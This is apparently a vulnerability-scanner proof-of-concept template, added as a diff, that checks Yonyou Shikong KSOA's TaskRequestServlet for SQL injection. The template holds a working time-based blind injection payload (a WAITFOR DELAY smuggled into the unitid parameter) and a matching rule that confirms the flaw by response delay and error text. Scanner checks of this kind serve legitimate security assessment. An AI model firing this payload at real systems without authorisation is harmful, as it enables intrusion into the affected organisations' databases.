@@ -1,0 +1,15 @@
+id: poc-yaml-yong-you-shi-kong-ksoa-taskrequestservlet-sqli
+info:
+  name: 用友时空KSOA-TaskRequestServlet-SQL注入
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--%20
+  expression: duration > t1 && status_code == 200 && !contains(body, "<") && contains(gbk_decode(body),
+    "error:连锁单位登录失败：登录单位不存在")
+transport: http
